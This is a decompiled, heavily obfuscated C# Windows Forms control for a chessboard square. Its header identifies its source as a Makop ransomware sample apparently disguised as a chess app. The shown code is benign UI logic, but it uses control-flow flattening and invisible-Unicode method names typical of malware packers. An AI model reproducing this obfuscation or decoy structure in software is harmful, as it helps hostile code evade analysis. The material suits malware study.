// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.SimpleSquare
// Assembly: Gز, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 19F72CF4-8E17-4C69-9694-AAB2F68A841C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-315cc7a49fb61eb58200e4b8294fb4a7c58ef16bdf813f48fa8d114a9804258a.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  public class SimpleSquare : UserControl
  {
    private Color DefaultColor;
    private ChessPiece piece;
    private bool isBlackSquare;
    private IContainer components = (IContainer) null;
    public Panel panel1;

    public event EventHandler<MouseEventArgs> Click
    {
      add
      {
        EventHandler<MouseEventArgs> eventHandler = this.Click;
label_1:
        int num1 = -320582627;
        EventHandler<MouseEventArgs> comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -77832258)) % 5U)
          {
            case 0:
              eventHandler = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, (EventHandler<MouseEventArgs>) SimpleSquare.\u202C⁫‏‎‎‭⁫‭⁫‬‭​⁬‬​⁭‭‎⁭‎‏‭‌‮⁭⁫⁫‮⁫⁬⁭‮⁫‮⁯⁬⁫⁯‌⁪‮((Delegate) comparand, (Delegate) value), comparand);
              num1 = (int) num2 * -488088653 ^ -888134252;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              int num3 = eventHandler == comparand ? 1531299243 : (num3 = 1743856383);
              num1 = num3 ^ (int) num2 * 838422725;
              continue;
            case 4:
              comparand = eventHandler;
              num1 = -611783474;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
      remove
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = -404566412;
        EventHandler<MouseEventArgs> eventHandler2;
        EventHandler<MouseEventArgs> comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -796643173)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              num1 = (int) num2 * -1492699897 ^ 274483452;
              continue;
            case 3:
              int num3 = eventHandler1 == comparand ? 893143642 : (num3 = 1803110982);
              num1 = num3 ^ (int) num2 * 1879470398;
              continue;
            case 4:
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u206F⁫‬‮‏‫⁪⁪‭⁬‭‏‎‎​‪‪​‍‍⁬⁯⁫‎‬‌‎‎⁯‫‭⁫⁯⁪‮‏‮‭⁪‬‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * -2072159133 ^ 1204738351;
              continue;
            case 5:
              comparand = eventHandler1;
              num1 = -1370500345;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public ChessPiece Piece
    {
      get => this.piece;
      set
      {
label_1:
        int num1 = -809712944;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -887168928)) % 7U)
          {
            case 0:
              SimpleSquare.\u200E‎‮​‎⁯‎‏⁪‎⁪⁭⁭‍‌⁭‮‪⁬‪⁯‬⁮⁮​⁬‍⁯⁫⁯⁫‎‌‬‌⁭⁫⁪‮⁪‮((Control) this, this.repo.GetPiece(this.piece.Kind, this.piece.Color));
              num1 = -630551266;
              continue;
            case 1:
              this.piece = (ChessPiece) null;
              num1 = (int) num2 * 938188196 ^ 365759107;
              continue;
            case 2:
              goto label_1;
            case 3:
              this.piece = value;
              int num3 = this.piece != null ? -298409081 : (num3 = -1400783061);
              num1 = num3 ^ (int) num2 * 524219991;
              continue;
            case 4:
              num1 = (int) num2 * 1546878766 ^ 1274184365;
              continue;
            case 5:
              SimpleSquare.\u200E‎‮​‎⁯‎‏⁪‎⁪⁭⁭‍‌⁭‮‪⁬‪⁯‬⁮⁮​⁬‍⁯⁫⁯⁫‎‌‬‌⁭⁫⁪‮⁪‮((Control) this, (Image) null);
              num1 = (int) num2 * 2070954175 ^ -1485564161;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    public void colorSquare()
    {
      this.DefaultColor = this.IsBlackSquare ? Color.CornflowerBlue : Color.WhiteSmoke;
      SimpleSquare.\u202E⁬⁬‎‬​​‌⁫‪‌‮‏​⁯‌⁮‪‌‮⁪‮‭‭‎⁫⁮⁬‪​‌⁪​‭‭⁫‎‮⁯⁭‮((Control) this, this.DefaultColor);
    }

    public Pieces Kind
    {
      set
      {
label_1:
        int num1 = 1137351019;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 193719668)) % 4U)
          {
            case 0:
              num1 = (int) num2 * 571593108 ^ -1350113663;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              this.Piece.Kind = value;
              this.Piece = this.Piece;
              num1 = (int) num2 * -834736485 ^ -1434712251;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public bool IsBlackSquare
    {
      get
      {
label_1:
        int num1 = 1428488113;
        bool isBlackSquare;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1839306133)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              isBlackSquare = this.isBlackSquare;
              num1 = (int) num2 * -635813758 ^ 1475908323;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return isBlackSquare;
      }
      set
      {
label_1:
        int num1 = 454899107;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1585113775)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              this.isBlackSquare = value;
              num1 = (int) num2 * 896561159 ^ 1406555667;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        this.colorSquare();
      }
    }

    public Repository repo
    {
      get
      {
        Repository repo = ChessContext.repo;
label_1:
        int num1 = -1678920911;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -170163806)) % 3U)
          {
            case 1:
              num1 = (int) num2 * -492684489 ^ 1575877816;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return repo;
      }
    }

    public SimpleSquare()
    {
label_1:
      int num1 = -1165561955;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1946770933)) % 6U)
        {
          case 0:
            num1 = (int) num2 * -636122656 ^ 1398020966;
            continue;
          case 1:
            goto label_3;
          case 2:
            this.InitializeComponent();
            num1 = (int) num2 * -961937256 ^ 235887403;
            continue;
          case 3:
            goto label_1;
          case 4:
            num1 = (int) num2 * -1981260113 ^ 1197212551;
            continue;
          case 5:
            SimpleSquare.\u200B⁫⁯​‫⁮‍⁪‎‏‭⁯‭‍‎‌⁪⁯‍‪‎⁮‭‮‏‭‭⁯‌⁯‌⁯‫⁯‎‏⁪⁮⁪‫‮((Control) this, new MouseEventHandler(this.Square_MouseClick));
            SimpleSquare.\u206B⁪⁯‫‬‭⁯⁭‭⁬‌⁭⁮⁮⁮‬⁭⁪‮⁬‮‏⁮⁭‌⁪‬‍​⁬‫⁫‭​⁫‍​‮​⁯‮((Control) this.panel1, new MouseEventHandler(this.Square_MouseClick));
            num1 = (int) num2 * -987197364 ^ 267297508;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:;
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
label_1:
      int num1 = 266507834;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1640500837)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -1084816520 ^ -552255648;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_1;
          case 3:
            EventHandler<MouseEventArgs> click = this.Click;
            if (click != null)
            {
              click((object) this, e);
              num1 = (int) num2 * -263574325 ^ -2142223588;
              continue;
            }
            goto label_5;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_5:;
    }

    public void HighLight()
    {
label_1:
      int num1 = 499168361;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 711562539)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            SimpleSquare.\u202E⁬⁬‎‬​​‌⁫‪‌‮‏​⁯‌⁮‪‌‮⁪‮‭‭‎⁫⁮⁬‪​‌⁪​‭‭⁫‎‮⁯⁭‮((Control) this, Color.ForestGreen);
            num1 = (int) num2 * 1302294555 ^ 449004395;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public void ClearHighLight() => SimpleSquare.\u202E⁬⁬‎‬​​‌⁫‪‌‮‏​⁯‌⁮‪‌‮⁪‮‭‭‎⁫⁮⁬‪​‌⁪​‭‭⁫‎‮⁯⁭‮((Control) this, this.DefaultColor);

    public bool IsEmpty => this.Piece == null;

    protected override void Dispose(bool disposing)
    {
      if (!disposing)
        goto label_4;
label_1:
      int num1 = -124779069;
label_2:
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1665306937)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            SimpleSquare.\u200C⁫‏⁪‭⁯​‏‍⁮‪⁭‌‏‎‌⁭⁭‍⁮‭⁪‍‎‌‎⁫⁯‌‎‎‌‭‬⁬‭‏​⁪⁮‮((IDisposable) this.components);
            num1 = (int) num2 * -408177334 ^ 1865433496;
            continue;
          case 2:
            num1 = (int) num2 * -573625316 ^ -349339159;
            continue;
          case 3:
            num1 = (int) num2 * 1918721203 ^ -1845727784;
            continue;
          case 5:
            int num3 = !flag ? 1137038825 : (num3 = 534060605);
            num1 = num3 ^ (int) num2 * -2018814072;
            continue;
          case 6:
            goto label_3;
          default:
            goto label_10;
        }
      }
label_3:
      int num4 = this.components != null ? 1 : 0;
      goto label_5;
label_10:
      base.Dispose(disposing);
      return;
label_4:
      num4 = 0;
label_5:
      flag = num4 != 0;
      num1 = -1163616702;
      goto label_2;
    }

    private void InitializeComponent()
    {
label_1:
      int num1 = -1915896490;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -268321650)) % 23U)
        {
          case 0:
            num1 = (int) num2 * -1942217973 ^ -1920586751;
            continue;
          case 1:
            SimpleSquare.\u202A‍⁯‍⁪‬⁫‪⁭‫​‭⁭​‮​‎⁪⁫‫‏‏‍⁪⁪‌​‍‫‮‌‭⁯‍‮‌⁯‏⁫‌‮((Control) this.panel1, new Size(137, 132));
            num1 = (int) num2 * -115654193 ^ -1563348030;
            continue;
          case 2:
            this.panel1 = SimpleSquare.\u206D⁯‎‍‬‫⁭⁫​‮‬‫⁪‏⁬⁬‍⁮⁭⁪‎‫‏⁭⁫‫​‎⁪‬‍⁪‫‪​‬⁮‌⁯⁭‮();
            SimpleSquare.\u206B⁭‌‮‏‭‬‪‫⁮‏⁭‎⁪‍‏‎‬‪⁪‭⁮⁯‪⁯⁫‭‬‬‍‪‪⁯‏‪⁭‫‪​⁫‮((Control) this);
            num1 = (int) num2 * -1700269217 ^ -122318054;
            continue;
          case 3:
            SimpleSquare.\u202B‭⁯‌‪⁫⁬‏⁮⁮⁬⁮‏‍‮⁪⁭‌‮‬⁮⁫‭‏‍⁫⁯⁮​‮⁪‍‭‍‪⁫‏‬⁭‪‮((Control) this, ImageLayout.Center);
            num1 = (int) num2 * -1222034944 ^ 951292256;
            continue;
          case 4:
            num1 = (int) num2 * 2092975990 ^ 1217564642;
            continue;
          case 5:
            SimpleSquare.\u206C‪⁭‭‎​‬‬‬⁯⁮⁭⁯⁬‮‍⁫⁮‬‮‭​‏⁭​‫‎​‏‫⁬⁭⁯⁭‮​⁯‌‌⁮‮((Control) this.panel1, 0);
            num1 = (int) num2 * -813631195 ^ 410013730;
            continue;
          case 6:
            SimpleSquare.\u202E⁬⁬‎‬​​‌⁫‪‌‮‏​⁯‌⁮‪‌‮⁪‮‭‭‎⁫⁮⁬‪​‌⁪​‭‭⁫‎‮⁯⁭‮((Control) this.panel1, Color.Transparent);
            num1 = (int) num2 * -645687770 ^ 1044489491;
            continue;
          case 7:
            SimpleSquare.\u202A⁯‌⁮⁫⁪⁫‮‌‎⁪‬‪⁫​‫⁭⁫⁭​‎⁭⁯‪‭‏⁬⁬‬⁯‍‭⁬‬‫‫⁫⁪⁭‮((Control) this, new Size(137, 132));
            num1 = (int) num2 * -411186522 ^ -1145729235;
            continue;
          case 8:
            goto label_1;
          case 9:
            SimpleSquare.\u200D⁪⁯‮‫⁮‬⁫⁯‮‫‍‍⁯⁪‏⁫‌‬‌​⁮⁪⁭⁯⁮⁫⁮‍⁮⁪‫‭‎‬⁬‍​⁫⁬‮((Control) this.panel1, \u003CModule\u003E.\u206F‭‌⁭‍⁪‬‏⁭⁭‫⁬‬​‏‍‭‌​⁬‭‏‎⁭‎‪‏⁮⁫⁪‎⁮⁭⁬⁫‎‏‎‮‏‮<string>(2278967098U));
            num1 = (int) num2 * 2099247518 ^ -1712827635;
            continue;
          case 10:
            SimpleSquare.\u200B‌‏‌‎‏⁪⁫⁮‫‍‭⁯‬‌‎⁫⁫⁪‬‌‫‏⁪‮‍⁬‍‭‍‌‭‬‍​‫⁯‬‪⁬‮((Control) this.panel1, new Point(0, 0));
            num1 = (int) num2 * 318766616 ^ -263249429;
            continue;
          case 11:
            num1 = (int) num2 * 2104627111 ^ 1401118286;
            continue;
          case 12:
            num1 = (int) num2 * -62627642 ^ -1341478139;
            continue;
          case 13:
            SimpleSquare.\u206F⁫‫⁭‎⁮‭⁫⁬‏⁭⁪‫‍‏​‬‍‭⁬‭⁬‌⁬​⁬‌⁮⁯‎‌‭‬⁫‬‫‍‎⁯‏‮((Control) this, false);
            num1 = (int) num2 * -956725234 ^ 1974439320;
            continue;
          case 14:
            SimpleSquare.\u206F‍⁬‎‍⁪‭⁮‭⁫‮‍⁭⁬‍‭⁯‪⁪⁬‭‬‏‫⁬‫‍‬​‮‭‭⁬‌‌⁪⁯‏⁬⁮‮((Control) this, new Padding(0));
            num1 = (int) num2 * 715147800 ^ -1266712655;
            continue;
          case 15:
            num1 = (int) num2 * -1118387770 ^ -691498672;
            continue;
          case 16:
            SimpleSquare.\u202D⁯​‌​⁫⁬⁬⁮‪⁫‪⁯‎⁯‎‫‬⁬‌⁬‪⁮‬‌‏⁯⁯⁭​‮⁯‭‭‏⁫​⁬⁯‎‮((Control) this, \u003CModule\u003E.\u206D‏⁮‍⁭‎⁯‎⁪‫‬⁬‍⁮‭⁯‫⁯‌⁪‏‎‌‭⁫‬‪‎‬⁫‪‬⁪‬‬⁪‍⁮⁪⁫‮<string>(420691473U));
            num1 = (int) num2 * 986627107 ^ -29614721;
            continue;
          case 17:
            SimpleSquare.\u202B‭⁯‌‪⁫⁬‏⁮⁮⁬⁮‏‍‮⁪⁭‌‮‬⁮⁫‭‏‍⁫⁯⁮​‮⁪‍‭‍‪⁫‏‬⁭‪‮((Control) this.panel1, ImageLayout.Center);
            SimpleSquare.\u206A⁪⁯‎​⁯​‮⁯‌​‪‏⁬⁬‌‫‭⁪‎⁮‮‭‏‮‭‍‪‭​⁫⁭‏​‏⁯​⁯⁫‮‮((Control) this.panel1, DockStyle.Fill);
            num1 = (int) num2 * -1909058857 ^ -2071981407;
            continue;
          case 18:
            SimpleSquare.\u206E⁪⁯‎⁫‭‎⁫‫⁯‪⁮⁪‭‪‍‮‍‭‎​⁭‫⁫⁮⁯⁭⁮‫‮⁭‎‎‪‌‌‮⁪‎‮‮(SimpleSquare.\u202D⁮​⁭​‪‏‌⁮‎‬‫‏​‍⁭‌⁫‭‬‏‭⁬​​⁬‭‎⁭‪‮‭⁪‫‎‮‫⁮‍‮‮((Control) this), (Control) this.panel1);
            num1 = (int) num2 * 270437676 ^ -2141402230;
            continue;
          case 19:
            SimpleSquare.\u202C​‭‮‍‬⁮⁮‎‭‪‭‭‭⁫⁭‌‏​⁬⁮⁫⁭‏‍⁬⁫⁪‭‫‏‎⁬‫‪‏‭‪‮‫‮((ContainerControl) this, new SizeF(6f, 13f));
            num1 = (int) num2 * 436132634 ^ -2136942653;
            continue;
          case 20:
            SimpleSquare.\u202D⁯‌‫⁫​‌⁭​⁫⁪⁪⁫‮​‭⁯‬‭⁮⁪⁮‍⁬‪‏‌‏‍⁬⁪⁯⁯‭‭⁭‬‮⁬⁯‮((ContainerControl) this, AutoScaleMode.Font);
            num1 = (int) num2 * -172872181 ^ 1734831169;
            continue;
          case 21:
            num1 = (int) num2 * 2061825949 ^ 1577200037;
            continue;
          case 22:
            goto label_3;
          default:
            goto label_25;
        }
      }
label_3:
      return;
label_25:;
    }

    static Delegate \u202C⁫‏‎‎‭⁫‭⁫‬‭​⁬‬​⁭‭‎⁭‎‏‭‌‮⁭⁫⁫‮⁫⁬⁭‮⁫‮⁯⁬⁫⁯‌⁪‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u206F⁫‬‮‏‫⁪⁪‭⁬‭‏‎‎​‪‪​‍‍⁬⁯⁫‎‬‌‎‎⁯‫‭⁫⁯⁪‮‏‮‭⁪‬‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static void \u200E‎‮​‎⁯‎‏⁪‎⁪⁭⁭‍‌⁭‮‪⁬‪⁯‬⁮⁮​⁬‍⁯⁫⁯⁫‎‌‬‌⁭⁫⁪‮⁪‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u202E⁬⁬‎‬​​‌⁫‪‌‮‏​⁯‌⁮‪‌‮⁪‮‭‭‎⁫⁮⁬‪​‌⁪​‭‭⁫‎‮⁯⁭‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static void \u200B⁫⁯​‫⁮‍⁪‎‏‭⁯‭‍‎‌⁪⁯‍‪‎⁮‭‮‏‭‭⁯‌⁯‌⁯‫⁯‎‏⁪⁮⁪‫‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u206B⁪⁯‫‬‭⁯⁭‭⁬‌⁭⁮⁮⁮‬⁭⁪‮⁬‮‏⁮⁭‌⁪‬‍​⁬‫⁫‭​⁫‍​‮​⁯‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u200C⁫‏⁪‭⁯​‏‍⁮‪⁭‌‏‎‌⁭⁭‍⁮‭⁪‍‎‌‎⁫⁯‌‎‎‌‭‬⁬‭‏​⁪⁮‮([In] IDisposable obj0) => obj0.Dispose();

    static Panel \u206D⁯‎‍‬‫⁭⁫​‮‬‫⁪‏⁬⁬‍⁮⁭⁪‎‫‏⁭⁫‫​‎⁪‬‍⁪‫‪​‬⁮‌⁯⁭‮() => new Panel();

    static void \u206B⁭‌‮‏‭‬‪‫⁮‏⁭‎⁪‍‏‎‬‪⁪‭⁮⁯‪⁯⁫‭‬‬‍‪‪⁯‏‪⁭‫‪​⁫‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u202B‭⁯‌‪⁫⁬‏⁮⁮⁬⁮‏‍‮⁪⁭‌‮‬⁮⁫‭‏‍⁫⁯⁮​‮⁪‍‭‍‪⁫‏‬⁭‪‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u206A⁪⁯‎​⁯​‮⁯‌​‪‏⁬⁬‌‫‭⁪‎⁮‮‭‏‮‭‍‪‭​⁫⁭‏​‏⁯​⁯⁫‮‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static void \u200B‌‏‌‎‏⁪⁫⁮‫‍‭⁯‬‌‎⁫⁫⁪‬‌‫‏⁪‮‍⁬‍‭‍‌‭‬‍​‫⁯‬‪⁬‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u200D⁪⁯‮‫⁮‬⁫⁯‮‫‍‍⁯⁪‏⁫‌‬‌​⁮⁪⁭⁯⁮⁫⁮‍⁮⁪‫‭‎‬⁬‍​⁫⁬‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u202A‍⁯‍⁪‬⁫‪⁭‫​‭⁭​‮​‎⁪⁫‫‏‏‍⁪⁪‌​‍‫‮‌‭⁯‍‮‌⁯‏⁫‌‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u206C‪⁭‭‎​‬‬‬⁯⁮⁭⁯⁬‮‍⁫⁮‬‮‭​‏⁭​‫‎​‏‫⁬⁭⁯⁭‮​⁯‌‌⁮‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static void \u202C​‭‮‍‬⁮⁮‎‭‪‭‭‭⁫⁭‌‏​⁬⁮⁫⁭‏‍⁬⁫⁪‭‫‏‎⁬‫‪‏‭‪‮‫‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u202D⁯‌‫⁫​‌⁭​⁫⁪⁪⁫‮​‭⁯‬‭⁮⁪⁮‍⁬‪‏‌‏‍⁬⁪⁯⁯‭‭⁭‬‮⁬⁯‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static Control.ControlCollection \u202D⁮​⁭​‪‏‌⁮‎‬‫‏​‍⁭‌⁫‭‬‏‭⁬​​⁬‭‎⁭‪‮‭⁪‫‎‮‫⁮‍‮‮(
      [In] Control obj0)
    {
      return obj0.Controls;
    }

    static void \u206E⁪⁯‎⁫‭‎⁫‫⁯‪⁮⁪‭‪‍‮‍‭‎​⁭‫⁫⁮⁯⁭⁮‫‮⁭‎‎‪‌‌‮⁪‎‮‮(
      [In] Control.ControlCollection obj0,
      [In] Control obj1)
    {
      obj0.Add(obj1);
    }

    static void \u206F‍⁬‎‍⁪‭⁮‭⁫‮‍⁭⁬‍‭⁯‪⁪⁬‭‬‏‫⁬‫‍‬​‮‭‭⁬‌‌⁪⁯‏⁬⁮‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u202D⁯​‌​⁫⁬⁬⁮‪⁫‪⁯‎⁯‎‫‬⁬‌⁬‪⁮‬‌‏⁯⁯⁭​‮⁯‭‭‏⁫​⁬⁯‎‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u202A⁯‌⁮⁫⁪⁫‮‌‎⁪‬‪⁫​‫⁭⁫⁭​‎⁭⁯‪‭‏⁬⁬‬⁯‍‭⁬‬‫‫⁫⁪⁭‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u206F⁫‫⁭‎⁮‭⁫⁬‏⁭⁪‫‍‏​‬‍‭⁬‭⁬‌⁬​⁬‌⁮⁯‎‌‭‬⁫‬‫‍‎⁯‏‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
